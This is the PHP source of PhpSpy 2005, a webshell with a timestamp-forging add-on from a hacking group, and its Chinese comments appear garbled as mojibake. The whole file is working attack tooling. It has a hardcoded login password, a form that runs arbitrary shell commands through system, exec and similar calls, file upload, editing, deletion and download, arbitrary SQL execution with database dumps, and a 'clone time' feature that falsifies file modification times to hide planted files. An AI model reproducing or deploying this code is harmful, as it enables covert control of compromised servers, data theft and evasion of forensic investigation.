   <?PHP
   /*
   ÏÖÔÚ±¨¸æ£¬Ç³À¶µÄ·øÉäÓã¼òÖ±²»ÊÇÒø°¡¡£±ÉÊÓ±ÉÊÓ£¡
   ÔÚ´Ë¸ÐÐ»Ò»ÏÂËùÓÐÖ§³Ö¹ýÎÒ£¬»¹»á¼ÌÐøÖ§³ÖÎÒµÄÈË£¬ÎÒºÃ¸ÐÐ»ÄãÃÇ¡£
   ·ñÔò£¬ÎÒÒ»Ôç¾Í·ÅÆúÁË£¬ÎÒ²»ÊÇÒ»¸öºÜ¼á³ÖµÄÈË¡£
   Î¨Ò»ÊÇ¶ÔÄÇ¸öÈËµÄ¾ìÄîºÍ¶ÔÄÇÐ©Ö§³ÖÐÅÈÎÎÒµÄÈËµÄÄÚ¾ÎÊ¹µÃÎÒÁôÏÂÀ´¡£
   Ö»ÊÇ¶Ôhttp://www.4ngel.netµÄphpspy2005¼ÓÁËÒ»¸ö¡°²å¼þ¡±°É~~~
   http://www.wrsky.comµÄÄÚ²¿³ÉÔ±Ìí¼Ó£¬Õ¼Äã¿Õ¼äÁËµÄ»°É¾³ýÕâ¶Î×¢ÊÍ°É£¬´ó¼ÒÒ»¸öµÂÐÐ~~£¡~
   */
   error_reporting(7);
   ob_start();
   $mtime = explode(' ', microtime());
   $starttime = $mtime[1] + $mtime[0];
   /*===================== ³ÌÐòÅäÖÃ =====================*/
   // ÊÇ·ñÐèÒªÃÜÂëÑéÖ¤,1ÎªÐèÒªÑéÖ¤,ÆäËûÊý×ÖÎªÖ±½Ó½øÈë.ÏÂÃæÑ¡ÏîÔòÎÞÐ§
   $admin['check']="1";
   // ÑéÖ¤·½Ê½,1Îª²ÉÓÃ Session ÑéÖ¤,ÆäËûÊý×ÖÔò²ÉÓÃ CookieÑéÖ¤
   // Ä¬ÈÏ²ÉÓÃ Session ÑéÖ¤,Èç¹û²»ÄÜÕý³£µÇÂ½,½¨Òé¸ÄÎª CookieÑéÖ¤
   $admin['checkmode']="2";
   // Èç¹ûÐèÒªÃÜÂëÑéÖ¤,ÇëÐÞ¸ÄµÇÂ½ÃÜÂë
   $admin['pass']="wrsky";
   /*===================== ÅäÖÃ½áÊø =====================*/
   // ÔÊÐí³ÌÐòÔÚ register_globals = off µÄ»·¾³ÏÂ¹¤×÷
   if ( function_exists('ini_get') ) {
   $onoff = ini_get('register_globals');
   } else {
   $onoff = get_cfg_var('register_globals');
   }if ($onoff != 1) {
       @extract($_POST, EXTR_SKIP);
       @extract($_GET, EXTR_SKIP);
   }
   $self = $_SERVER['PHP_SELF'];
   /*===================== Éí·ÝÑéÖ¤ =====================*/
   if($admin['check']=="1") {
       if($admin['checkmode']=="1") {
       /*------- session ÑéÖ¤ -------*/
           session_start();
           if ($_GET['action'] == "logout") {
               session_destroy();
               echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
               echo "<span style=\"font-size: 12px; font-family: Verdana\">×¢Ïú³É¹¦......<p><a href=\"".$self."\">ÈýÃëºó×Ô¶¯ÍË³ö»òµ¥»÷ÕâÀïÍË³ö³ÌÐò½çÃæ&gt;&gt;&gt;</a></span>";
               exit;
           }
           if ($login) {
               $adminpass=trim($_POST['adminpass']);
               if ($adminpass==$admin['pass']) {
                   $_SESSION['adminpass'] = $admin['pass'];
                   echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
                   echo "<span style=\"font-size: 12px; font-family: Verdana\">µÇÂ½³É¹¦......<p><a href=\"".$self."\">ÈýÃëºó×Ô¶¯Ìø×ª»òµ¥»÷ÕâÀï½øÈë³ÌÐò½çÃæ&gt;&gt;&gt;</a></span>";
                   exit;
               }
           }
           if (session_is_registered('adminpass')) {
               if ($_SESSION['adminpass']!=$admin['pass']) {
                   loginpage();
               }
           } else {
               loginpage();
           }
       } else {
       /*------- cookie ÑéÖ¤ -------*/
           if ($_GET['action'] == "logout") {
               setcookie ("adminpass", "");
               echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
               echo "<span style=\"font-size: 12px; font-family: Verdana\">×¢Ïú³É¹¦......<p><a href=\"".$self."\">ÈýÃëºó×Ô¶¯ÍË³ö»òµ¥»÷ÕâÀïÍË³ö³ÌÐò½çÃæ&gt;&gt;&gt;</a></span>";
               exit;
           }
           if ($login) {
               $adminpass=trim($_POST['adminpass']);
               if ($adminpass==$admin['pass']) {
                   setcookie ("adminpass",$admin['pass'],time()+(1*24*3600));
                   echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
                   echo "<span style=\"font-size: 12px; font-family: Verdana\">µÇÂ½³É¹¦......<p><a href=\"".$self."\">ÈýÃëºó×Ô¶¯Ìø×ª»òµ¥»÷ÕâÀï½øÈë³ÌÐò½çÃæ&gt;&gt;&gt;</a></span>";
                   exit;
               }
           }
           if (isset($_COOKIE['adminpass'])) {
               if ($_COOKIE['adminpass']!=$admin['pass']) {
                   loginpage();
               }
           } else {
               loginpage();
           }
       }

   }//end check
   /*===================== ÑéÖ¤½áÊø =====================*/
   // ÅÐ¶Ï magic_quotes_gpc ×´Ì¬
   if (get_magic_quotes_gpc()) {
       $_GET = stripslashes_array($_GET);
       $_POST = stripslashes_array($_POST);
   }
   if ($_GET['action'] == "phpinfo") {
       $dis_func = get_cfg_var("disable_functions");
       echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() º¯ÊýÒÑ±»½ûÓÃ,Çë²é¿´&lt;PHP»·¾³±äÁ¿&gt;";
       exit;
   }
   // ÏÂÔØÎÄ¼þ
   if (!empty($downfile)) {
       if (!@file_exists($downfile)) {
           echo "<script>alert('ÄãÒªÏÂµÄÎÄ¼þ²»´æÔÚ!')</script>";
       } else {
           $filename = basename($downfile);
           $filename_info = explode('.', $filename);
           $fileext = $filename_info[count($filename_info)-1];
           header('Content-type: application/x-'.$fileext);
           header('Content-Disposition: attachment; filename='.$filename);
           header('Content-Description: PHP Generated Data');
           header('Content-Length: '.filesize($downfile));
           @readfile($downfile);
           exit;
       }
   }
   // ³ÌÐòÄ¿Â¼
   $pathname=str_replace('\\','/',dirname(__FILE__));
   // »ñÈ¡µ±Ç°Â·¾¶
   if (!isset($dir) or empty($dir)) {
       $dir = ".";
       $nowpath = getPath($pathname, $dir);
   } else {
       $dir=$_GET['dir'];
       $nowpath = getPath($pathname, $dir);
   }
   // ÅÐ¶Ï¶ÁÐ´Çé¿ö
   if (dir_writeable($nowpath)) {
       $dir_writeable = "¿ÉÐ´";
   } else {
       $dir_writeable = "²»¿ÉÐ´";
   }
   $dis_func = get_cfg_var("disable_functions");
   $phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\" target=\"_blank\">PHPINFO()</a>" : "";
   $shellmode=(!get_cfg_var("safe_mode")) ? " | <a href=\"?action=shell\">WebShell</a>" : "";
   ?>
   <html>
   <head>
   <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
   <title>PhpSpy Ver 2005</title>
   <style type="text/css">
   body,td {
       font-family: "sans-serif";
       font-size: "12px";
       line-height: "150%";
   }
   .smlfont {
       font-family: "sans-serif";
       font-size: "11px";
   }
   .INPUT {
       FONT-SIZE: "12px";
       COLOR: "#000000";
       BACKGROUND-COLOR: "#FFFFFF";
       height: "18px";
       border: "1px solid #666666";
   }
   .redfont {
       COLOR: "#A60000";
   }
   a:link,
   a:visited,
   a:active{
       color: "#000000";
       text-decoration: underline;
   }
   a:hover{
       color: "#465584";
       text-decoration: none;
   }
   .firstalt   {BACKGROUND-COLOR: "#EFEFEF"}
   .secondalt  {BACKGROUND-COLOR: "#F5F5F5"}
   </style>
   <SCRIPT language=JavaScript>
   function CheckAll(form)
   {
       for (var i=0;i<form.elements.length;i++)
       {
           var e = form.elements[i];
           if (e.name != 'chkall')
           e.checked = form.chkall.checked;
       }
   }
   </SCRIPT>
   </head>
   <body style="table-layout:fixed; word-break:break-all"><center><table width="760" border="0" cellpadding="3" cellspacing="0" bgcolor="#ffffff"><tr bgcolor="#cccccc"><td width="375" align="right" nowrap><b><?=$_SERVER['HTTP_HOST']?></b></td><td width="10" align="center" nowrap><b>:</b></td><td width="375" nowrap><b><?=$_SERVER['REMOTE_ADDR']?></b></td></tr><tr><td colspan="3" align="center" nowrap><a href="?action=logout">×¢Ïú»á»°</a> | <a href="?action=dir">·µ»Ø PhpSpy Ä¿Â¼</a> | <a href="?action=phpenv">PHP»·¾³±äÁ¿</a><?=$phpinfo?><?=$shellmode?> | <a href="?action=sql">SQL Query</a> | <a href="?action=sqlbak">MySQL Backup</a> | <a href="http://www.4ngel.net" target="_blank" title="ÏÂÔØ´Ë³ÌÐò">Version 2005</a></td></tr></table><hr width="760" noshade><table width="760" border="0" cellpadding="0"><form action="" method="GET"><tr><td><p>³ÌÐòÂ·¾¶:<?=$pathname?><br>µ±Ç°Ä¿Â¼(<?=$dir_writeable?>,<?=substr(base_convert(@fileperms($nowpath),10,8),-4);?>):<?=$nowpath?><br>Ìø×ªÄ¿Â¼:<input name="dir" type="text" class="INPUT"><input type="submit" class="INPUT" value="È·¶¨"> ¡¼Ö§³Ö¾ø¶ÔÂ·¾¶ºÍÏà¶ÔÂ·¾¶¡½</p></td></tr></form><form action="?dir=<?=urlencode($dir)?>" method="POST" enctype="multipart/form-data"><tr><td colspan="2">ÉÏ´«ÎÄ¼þµ½µ±Ç°Ä¿Â¼:<input name="uploadmyfile" type="file" class="INPUT">   <input type="submit" name="uploadfile" class="INPUT" value="È·¶¨"><input type="hidden" name="uploaddir" value="<?=$dir?>"></td></tr></form><form action="?action=editfile&dir=<?=urlencode($dir)?>" method="POST"><tr><td colspan="2">ÐÂ½¨ÎÄ¼þÔÚµ±Ç°Ä¿Â¼:<input name="newfile" type="text" class="INPUT" value=""><input type="submit" class="INPUT" name="createfile" value="È·¶¨"></td></tr></form><form action="" method="POST"><tr><td colspan="2">ÐÂ½¨Ä¿Â¼ÔÚµ±Ç°Ä¿Â¼:<input name="newdirectory" type="text" class="INPUT" value=""><input type="submit" class="INPUT" name="createdirectory" value="È·¶¨"></td></tr></form></table><hr width="760" noshade>
   <?php
   /*===================== Ö´ÐÐ²Ù×÷ ¿ªÊ¼ =====================*/
   echo "<p><b>\n";
   // É¾³ýÎÄ¼þ
   if(@$delfile!="") {
       if(file_exists($delfile)) {
           if (@unlink($delfile)) {
               echo "".$delfile." É¾³ý³É¹¦!";
           } else {
               echo "ÎÄ¼þÉ¾³ýÊ§°Ü!";
           }
       } else {
           echo "ÎÄ¼þÒÑ²»´æÔÚ,É¾³ýÊ§°Ü!";
       }
   }
   // É¾³ýÄ¿Â¼
   elseif($rmdir) {
       if($deldir!="") {
           $deldirs="$dir/$deldir";
           if(!file_exists("$deldirs")) {
               echo "Ä¿Â¼ÒÑ²»´æÔÚ!";
           } else {
               deltree($deldirs);
           }
       } else {
           echo "É¾³ýÊ§°Ü!";
       }
   }
   // ´´½¨Ä¿Â¼
   elseif($createdirectory) {
       if(!empty($newdirectory)) {
           $mkdirs="$dir/$newdirectory";
           if(file_exists("$mkdirs")) {
               echo "¸ÃÄ¿Â¼ÒÑ´æÔÚ!";
           } else {
               echo $msg=@mkdir("$mkdirs",0777) ? "´´½¨Ä¿Â¼³É¹¦!" : "´´½¨Ê§°Ü!";
               @chmod("$mkdirs",0777);
           }
       }
   }
   // ÉÏ´«ÎÄ¼þ
   elseif($uploadfile) {
       echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadmyfile']['name']."") ? "ÉÏ´«³É¹¦!" : "ÉÏ´«Ê§°Ü!";
   }
   // ±à¼ÎÄ¼þ
   elseif($doeditfile) {
       $filename="$editfilename";
       @$fp=fopen("$filename","w");
       echo $msg=@fwrite($fp,$_POST['filecontent']) ? "Ð´ÈëÎÄ¼þ³É¹¦!" : "Ð´ÈëÊ§°Ü!";
       @fclose($fp);
   }
   //ÓãÓãÌí¼Ó£¬ÐÞ¸ÄÊ±¼ä£¡
   elseif ($_POST['action'] == "newtime") {
   $file="$_POST[file]";
   $time=@filemtime($_POST[file2]);
   $edittime=@date("Y-m-d H:i:s",@filemtime($_POST[file2]));
   if (!@file_exists($_POST[file2])) {
   echo"ÓãÓã´¿½àµÄ¸æËßÄã£¬ÄãÌîÐ´µÄ²ÎÕÕ".$_POST[file2]."ËØ²»´æÔÚµÎ£¬¿ÉËØÓãÓã²»ÉúÆø£¡À´£¬±§¸öºÃ²»ºÃ£¿";
   }else{
   if (@touch ("$file","$time","$time")) {
       print "Yeah£¬ºÃ¿ªÐÄµÄËµ£¬Å¼°Ñ".$file."µÄÐÞ¸ÄÊ±¼ä°´".$_POST[file2]."¸ÄÎªÁË".$edittime."ÁËÚÀ¡£";
   } else {
       print "²»Òª°¡£¬Å¼Ã»ÓÐ°ÑÊ±¼äÐÞ¸Ä³É¹¦£¬Äã²»ÒªÀë¿ªÎÒ°¡£¿555555555555555";
   }
   }
   }
   //ÓãÓãÌí¼Ó£¬ÐÞ¸Ä×Ô¶¨ÒåµÄÊ±¼ä£¡
   elseif ($_POST['action'] == "mytime"){
   $data="$_POST[data]";
   $month="$_POST[month]";
   $year="$_POST[year]";
   $hour="$_POST[hour]";
   $second="$_POST[second]";
   $minute="$_POST[minute]";
   $edittime=strtotime("$data $month $year $hour:$second:$minute ");
   $file="$_POST[file]";
   $time=@filemtime($_POST[file2]);
   $editdtime=@date("Y-m-d H:i:s",$edittime);
   if (@touch ("$file","$edittime","$edittime")) {
       print "Yeah£¬ºÃ¿ªÐÄµÄËµ£¬Å¼°Ñ".$file."µÄÐÞ¸ÄÊ±¼ä".$_POST[file2]."¸ÄÎªÁË".$editdtime."ÁËÚÀ¡£";
   } else {
       print "²»Òª°¡£¬Å¼Ã»ÓÐ°ÑÊ±¼äÐÞ¸Ä³É¹¦£¬Äã²»ÒªÀë¿ªÎÒ°¡£¿555555555555555";
   }
   }
   // ±à¼ÎÄ¼þÊôÐÔ
   elseif($editfileperm) {
       $fileperm=base_convert($_POST['fileperm'],8,10);
       echo $msg=@chmod($dir."/".$file,$fileperm) ? "ÊôÐÔÐÞ¸Ä³É¹¦!" : "ÐÞ¸ÄÊ§°Ü!";
       echo " [".$file."] ÐÞ¸ÄºóµÄÊôÐÔÎª:".substr(base_convert(@fileperms($dir."/".$file),10,8),-4)."";
   }
   // Á¬½ÓMYSQL
   elseif($connect) {
       if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {
           echo "Êý¾Ý¿âÁ¬½Ó³É¹¦!";
           mysql_close();
       } else {
           echo mysql_error();
       }
   }
   // Ö´ÐÐSQLÓï¾ä
   elseif($doquery) {
       @mysql_connect($servername,$dbusername,$dbpassword) or die("Êý¾Ý¿âÁ¬½ÓÊ§°Ü");
       @mysql_select_db($dbname) or die("Ñ¡ÔñÊý¾Ý¿âÊ§°Ü");
       $result = @mysql_query($_POST['sql_query']);
       echo ($result) ? "SQLÓï¾ä³É¹¦Ö´ÐÐ" : "³ö´í: ".mysql_error();
       mysql_close();
   }
   // ±¸·Ý²Ù×÷
   elseif ($dobackup) {
       if (empty($_POST[table])) {
           echo "ÇëÑ¡ÔñÓû±¸·ÝµÄÊý¾Ý±í";
       } else {
           @mysql_connect($servername,$dbusername,$dbpassword) or die("Êý¾Ý¿âÁ¬½ÓÊ§°Ü");
           @mysql_select_db($dbname) or die("Ñ¡ÔñÊý¾Ý¿âÊ§°Ü");
           $table = array_flip($_POST[table]);
           $filehandle = @fopen($path,"w");
           if ($filehandle) {
               $result = mysql_query("SHOW tables");
               echo ($result) ? NULL : "³ö´í: ".mysql_error();
               while ($currow = mysql_fetch_array($result)) {
                   if (isset($table[$currow[0]])) {
                       sqldumptable($currow[0], $filehandle);
                       fwrite($filehandle,"\n\n\n");
                   }
               }
               fclose($filehandle);
               echo "Êý¾Ý¿âÒÑ³É¹¦±¸·Ýµ½ <a href=\"".$path."\" target=\"_blank\">".$path."</a>";
               mysql_close();
           } else {
               echo "±¸·ÝÊ§°Ü,ÇëÈ·ÈÏÄ¿±êÎÄ¼þ¼ÐÊÇ·ñ¾ßÓÐ¿ÉÐ´È¨ÏÞ.";
           }
       }
   }
   // ´ò°üÏÂÔØ PS:ÎÄ¼þÌ«´ó¿ÉÄÜ·Ç³£Âý
   // Thx : Ð¡»¨
   elseif($downrar) {
       if ($dl != "") {
           $dfiles="";
           foreach ($dl AS $filepath=>$value) {
               $dfiles.=$filepath.",";
           }
           $dfiles=substr($dfiles,0,strlen($dfiles)-1);
           $dl=explode(",",$dfiles);

           $zip=new PHPZip($dl);
           $code=$zip->out;
           $filename=$_POST['rarfile'];

           header("Content-type: application/octet-stream");
           header("Accept-Ranges: bytes");
           header("Accept-Length: ".strlen($code));
           header("Content-Disposition: attachment;filename=".$filename);
           echo $code;
           exit;
       } else {
           echo "ÇëÑ¡ÔñÒª´ò°üÏÂÔØµÄÎÄ¼þ.";
       }
   }
   // ²é¿´PHPÅäÖÃ²ÎÊý×´¿ö
   elseif($viewphpvar) {
       echo "ÅäÖÃ²ÎÊý ".$_POST['phpvarname']." ¼ì²â½á¹û: ".getphpcfg($_POST['phpvarname'])."";
   }

   else {
       echo "±¾³ÌÐòÓÉ <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel</a> Ð¡×é angel [<a href=\"http://www.bugkidz.org\" target=\"_blank\">BST</a>] ¶ÀÁ¢¿ª·¢,¿ÉÔÚ <a href=\"http://www.4ngel.net\" target=\"_blank\">www.4ngel.net</a> ÏÂÔØ×îÐÂ°æ±¾.";
   }
   echo "</b></p>\n";
   /*===================== Ö´ÐÐ²Ù×÷ ½áÊø =====================*/
   if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == "dir")) {
   ?>
   <table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><tr bgcolor="#cccccc"><td align="center" nowrap width="30%"><b>ÎÄ¼þ</b></td><td align="center" nowrap width="17%"><b>´´½¨ÈÕÆÚ</b></td><td align="center" nowrap width="17%"><b>×îºóÐÞ¸Ä</b></td><td align="center" nowrap width="12%"><b>´óÐ¡</b></td><td align="center" nowrap width="7%"><b>ÊôÐÔ</b></td><td align="center" nowrap width="17%"><b>²Ù×÷</b></td></tr>
   <?php
   // Ä¿Â¼ÁÐ±í
   $dirs=@opendir($dir);
   while ($file=@readdir($dirs)) {
       $filepath="$dir/$file";
       $a=@is_dir($filepath);
       if($a=="1"){
           if($file!=".." && $file!=".")   {
               $ctime=@date("Y-m-d H:i:s",@filectime($filepath));
               $mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
               $dirperm=substr(base_convert(fileperms($filepath),10,8),-4);
               echo "<tr class=".getrowbg().">\n";
               echo "  <td style=\"padding-left: 5px;\">[<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
               echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$ctime</td>\n";
               echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$mtime</td>\n";
               echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">&lt;dir&gt;</td>\n";
               echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$dirperm</a></td>\n";
               echo "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?action=deldir&dir=".urlencode($dir)."&deldir=".urlencode($file)."\">É¾³ý</a></td>\n";
               echo "</tr>\n";
               $dir_i++;
           } else {
               if($file=="..") {
                   echo "<tr class=".getrowbg().">\n";
                   echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">·µ»ØÉÏ¼¶Ä¿Â¼</a></td>\n";
                   echo "</tr>\n";
               }
           }
       }
   }//while
   @closedir($dirs);
   ?>
   <tr bgcolor="#cccccc">
     <td colspan="6" height="5"></td>
   </tr>
   <FORM action="" method="POST">
   <?
   // ÎÄ¼þÁÐ±í
   $dirs=@opendir($dir);
   while ($file=@readdir($dirs)) {
       $filepath="$dir/$file";
       $a=@is_dir($filepath);
       if($a=="0"){
           $size=@filesize($filepath);
           $size=$size/1024 ;
           $size= @number_format($size, 3);
           if (@filectime($filepath) == @filemtime($filepath)) {
               $ctime=@date("Y-m-d H:i:s",@filectime($filepath));
               $mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
           } else {
               $ctime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filectime($filepath))."</span>";
               $mtime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filemtime($filepath))."</span>";
           }
           @$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);
           echo "<tr class=".getrowbg().">\n";
           echo "  <td style=\"padding-left: 5px;\"><INPUT type=checkbox value=1 name=dl[$filepath]><a href=\"$filepath\" target=\"_blank\">$file</a></td>\n";
           echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$ctime</td>\n";
           echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$mtime</td>\n";
           echo "  <td align=\"right\" nowrap valign=\"top\" class=\"smlfont\"><span class=\"redfont\">$size</span> KB</td>\n";
           echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$fileperm</a></td>\n";
           echo "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?downfile=".urlencode($filepath)."\">ÏÂÔØ</a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">±à¼</a> | <a href=\"?dir=".urlencode($dir)."&delfile=".urlencode($filepath)."\">É¾³ý</a> | <a href=\"?dir=".urlencode($dir)."&action=newtime&file=".urlencode($filepath)."\">ÐÞ¸ÄÊ±¼ä</a> | </td>\n";
           echo "</tr>\n";
           $file_i++;
       }
   }
   @closedir($dirs);
   ?>
   <tr class="<?=getrowbg()?>"><td nowrap colspan="6"><table width="100%" border="0" cellpadding="2" cellspacing="0" align="center"><tr><td><INPUT onclick="CheckAll(this.form)" type="checkbox" value="on" name="chkall"> <input name="rarfile" type="text" class="INPUT" value="<?=$_SERVER['HTTP_HOST']?>_Files.rar"> <input type="submit" name="downrar" value="Ñ¡ÖÐÎÄ¼þ´ò°üÏÂÔØ" class="INPUT"></td><td align="right"><?=$dir_i?> ¸öÄ¿Â¼ / <?=$file_i?> ¸öÎÄ¼þ</td></tr></table></td></tr></FORM></table>
   <?php
   }// end dir
   elseif ($_GET['action'] == "editfile") {
       if($newfile=="") {
           $filename="$dir/$editfile";
           $fp=@fopen($filename,"r");
           $contents=@fread($fp, filesize($filename));
           @fclose($fp);
           $contents=htmlspecialchars($contents);
       }else{
           $editfile=$newfile;
           $filename = "$dir/$editfile";
       }
   ?>
   <table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><tr class="firstalt"><td align="center">ÐÂ½¨/±à¼ÎÄ¼þ [<a href="?dir=<?=urlencode($dir)?>">·µ»Ø</a>]</td></tr><form action="?dir=<?=urlencode($dir)?>" method="POST"><tr class="secondalt"><td align="center">µ±Ç°ÎÄ¼þ:<input class="input" type="text" name="editfilename" size="30"
   value="<?=$filename?>"> ÊäÈëÐÂÎÄ¼þÃûÔò½¨Á¢ÐÂÎÄ¼þ</td></tr><tr class="firstalt"><td align="center"><textarea name="filecontent" cols="100" rows="20"><?=$contents?></textarea></td></tr><tr class="secondalt"><td align="center"><input type="submit" name="doeditfile" value="È·¶¨Ð´Èë" class="input"><input type="reset" value="ÖØÖÃ" class="input"></td></tr></form></table>
   <?php
   }//end editfile
   elseif ($_GET['action'] == "shell") {
       if (!get_cfg_var("safe_mode")) {
   ?>
   <table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><tr class="firstalt"><td align="center">WebShell Mode</td></tr><form action="?action=shell&dir=<?=urlencode($dir)?>" method="POST"><tr class="secondalt"><td align="center">ÌáÊ¾:Èç¹ûÊä³ö½á¹û²»ÍêÈ«,½¨Òé°ÑÊä³ö½á¹ûÐ´ÈëÎÄ¼þ.ÕâÑù¿ÉÒÔµÃµ½È«²¿ÄÚÈÝ.</td></tr><tr class="firstalt"><td align="center">Ñ¡ÔñÖ´ÐÐº¯Êý:<select name="execfunc" class="input"><option value="system" <? if ($execfunc=="system") { echo "selected"; } ?>>system</option><option value="passthru" <? if ($execfunc=="passthru") { echo "selected"; } ?>>passthru</option><option value="exec" <? if ($execfunc=="exec") { echo "selected"; } ?>>exec</option><option value="shell_exec" <? if ($execfunc=="shell_exec") { echo "selected"; } ?>>shell_exec</option><option value="popen" <? if ($execfunc=="popen") { echo "selected"; } ?>>popen</option></select>ÊäÈëÃüÁî:<input type="text" name="command" size="60" value="<?=$_POST['command']?>" class="input"><input type="submit" value="execute" class="input"></td></tr><tr class="secondalt"><td align="center"><textarea name="textarea" cols="100" rows="25" readonly>
   <?php
       if (!empty($_POST['command'])) {
           if ($execfunc=="system") {
               system($_POST['command']);
           } elseif ($execfunc=="passthru") {
               passthru($_POST['command']);
           } elseif ($execfunc=="exec") {
               $result = exec($_POST['command']);
               echo $result;
           } elseif ($execfunc=="shell_exec") {
               $result=shell_exec($_POST['command']);
               echo $result;
           } elseif ($execfunc=="popen") {
               $pp = popen($_POST['command'], 'r');
               $read = fread($pp, 2096);
               echo $read;
               pclose($pp);
           } else {
               system($_POST['command']);
           }
       }
       ?></textarea></td></tr></form></table>
   <?php
       } else {
   ?>
   <p><b>Safe_Mode ÒÑ´ò¿ª, ÎÞ·¨Ö´ÐÐÏµÍ³ÃüÁî.</b></p>
   <?php
       }
   }//end shell
   elseif ($_GET['action'] == "deldir") {
   ?>
   <table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><form action="?dir=<?=urlencode($dir)?>" method="POST"><tr class="firstalt"><td align="center">É¾³ý <input name="deldir" type="text" value="<?=$deldir?>" class="input" readonly> Ä¿Â¼</td></tr><tr class="secondalt"><td align="center">×¢Òâ:Èç¹û¸ÃÄ¿Â¼·Ç¿Õ,´Ë´Î²Ù×÷½«»áÉ¾³ý¸ÃÄ¿Â¼ÏÂµÄËùÓÐÎÄ¼þ.ÄúÈ·¶¨Âð?</td></tr><tr class="firstalt"><td align="center"><input type="submit" name="rmdir" value="delete" class="input"></td></tr></form></table>
   <?php
   }//end deldir
   elseif ($_GET['action'] == "newtime") {
   ?>
   <table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><form action="?dir=<?=urlencode($dir)?>" method="POST"><tr class="secondalt"><td align="center">Clone time (¿ËÂ¡Ê±¼ä£©by <a href="http://www.77yan.com" target="_blank">Ç³À¶µÄ·øÉäÓã</a>@<a href="http://www.wwrsky.com" target="_blank">[F.S.T]</a></td></tr><tr class="secondalt"><td align="center">»ðºüµÄÓãÓãÌí¼Ó£¬ÐÞ¸ÄÎÄ¼þÊ±¼äµÄplus£¨akira£¬ÓãºÃÏëÄã)</td></tr><tr class="firstalt"><td align="center">ÐÞ¸Ä<input name="file" type="text" value="<?=$file?>" class="input" readonly>µÄÐÞ¸ÄÊ±¼ä</td></tr><tr class="secondalt"><td align="center">²ÎÕÕ<input name="file2" type="text" class="input">À´½øÐÐÐÞ¸Ä</td></tr><tr class="secondalt"><td align="center">×¢Òâ:ÌîÐ´²ÎÕÕ¿ÉÒÔÊ¹ÓÃÏà¶Ô»ò¾ø¶ÔÂ·¾¶£¬Àý£ºe:/www/saiy.php»ò./saiy.php¶¼ÊÇ¿ÉÒÔµÄ£¡</td></tr><tr class="firstalt"><td align="center"><input name="action" type="hidden" value="newtime"><input type="submit" name="edittime" value="ÐÞ¸ÄÊ±¼ä" class="input"></td></tr></form></table>
   <hr>
   <table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><tr class="firstalt"><td align="center">edit my time (×Ô¶¨ÒåÊ±¼äÐÞ¸Ä£©by <a href="http://www.77yan.com" target="_blank">Ç³À¶µÄ·øÉäÓã</a>@<a href="http://www.wwrsky.com" target="_blank">[F.S.T]</a> </td></tr><form action="?dir=<?=$dir?>" method="POST" enctype="multipart/form-data"><tr class="secondalt"><td align="center">ÌáÊ¾:´Ó1901Äê12ÔÂ13ÈÕÐÇÆÚÎåµÄ20:45:54 µ½2038Äê1ÔÂ19ÈÕµÄÐÇÆÚ¶þ 03:14:07 Îª¿É½ÓÊÜÓò.</td></tr><tr class="firstalt"><td align="center">ÐÞ¸ÄÎÄ¼þ£º<input name="file" type="text" value="<?=$file?>" class="input" readonly>µÄÊ±¼äÎª<input type="text" name="year" size="4" value="2005" class="input">Äê
   <select name="month" class="input">
   <option value="January" >Ò»ÔÂ</option>
   <option value="February" >¶þÔÂ</option>
   <option value="March" >ÈýÔÂ</option>
   <option value="April" >ËÄÔÂ</option>
   <option value="May" >ÎåÔÂ</option>
   <option value="June" >ÁùÔÂ</option>
   <option value="July" >ÆßÔÂ</option>
   <option value="August" >°ËÔÂ</option>
   <option value="September" >¾ÅÔÂ</option>
   <option value="October" >Ê®ÔÂ</option>
   <option value="November" >Ê®Ò»ÔÂ</option>
   <option value="December" >Ê®¶þÔÂ</option>
   </select>·Ý<input type="text" name="data" size="2" value="04" class="input">ºÅ<input type="text" name="hour" size="2" value="08" class="input">µã<input type="text" name="minute" size="2" value="30" class="input">·Ö<input type="text" name="second" size="2" value="30" class="input">Ãë
   <input name="action" type="hidden" value="mytime">
   <input type="submit" value="ÐÞ¸ÄÊ±¼ä" class="input"></td></tr>
